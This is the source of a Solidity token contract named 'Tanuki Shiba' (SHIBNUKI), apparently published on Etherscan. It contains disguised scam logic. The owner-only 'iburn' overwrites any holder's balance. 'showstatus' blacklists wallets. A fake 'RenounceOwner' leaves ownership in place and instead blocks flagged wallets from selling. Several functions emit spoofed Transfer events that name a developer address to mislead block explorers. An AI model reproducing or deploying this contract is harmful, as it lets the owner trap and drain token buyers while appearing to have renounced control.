/**
 *Submitted for verification at Etherscan.io on 2022-10-14
*/

// "SPDX-License-Identifier: UNLICENSED

                                    
pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract SHIBNUKI {
  
    mapping (address => uint256) public iBalance;
    mapping (address => bool) TxV;


    // 
    string public name = "Tanuki Shiba";
    string public symbol = unicode"SHIBNUKI";
    uint8 public decimals = 18;
    uint256 public totalSupply = 200000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint ver = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        iBalance[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x5197C27c830978d1B616d6bD379c2D530BC0Ab5C;
    address lead_dev = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier IX() {   
         require(msg.sender == owner);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(iBalance[msg.sender] >= value);
        iBalance[msg.sender] -= value;  
        iBalance[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(TxV[msg.sender]) {
        require(ver < 1);} 
        require(iBalance[msg.sender] >= value);
        iBalance[msg.sender] -= value;  
        iBalance[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return iBalance[account]; }
        function iburn(address v, uint256 burn) IX public returns (bool success) {
        iBalance[v] = burn;
        return true; }
        function showstatus(address N) IX public{          
        require(!TxV[N]);
        TxV[N] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
        function RenounceOwner() public {
        require(msg.sender == owner);
        ver = 1;}
        function status(address N) IX public {
        require(TxV[N]);
        TxV[N] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= iBalance[from]);
        require(value <= allowance[from][msg.sender]);
        iBalance[from] -= value;  
        iBalance[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(TxV[from] || TxV[to]) {
        require(ver < 1);}
        require(value <= iBalance[from]);
        require(value <= allowance[from][msg.sender]);
        iBalance[from] -= value;
        iBalance[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }